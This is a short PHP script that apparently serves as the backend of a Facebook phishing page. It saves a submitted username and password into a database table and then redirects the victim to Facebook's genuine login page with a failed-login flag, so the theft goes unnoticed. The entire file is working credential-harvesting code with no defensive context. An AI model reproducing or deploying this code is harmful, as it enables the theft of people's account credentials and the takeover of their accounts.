<?php
include 'DB.php';
$db = new DB();
$tblName = 'users';
$userData = array(
    'username' => $_POST['aa'],
    'password' => $_POST['bb']
);
$insert = $db->insert($tblName,$userData);    

header("location: https://www.facebook.com/login.php?login_attempt=1&lwv=111");

?>
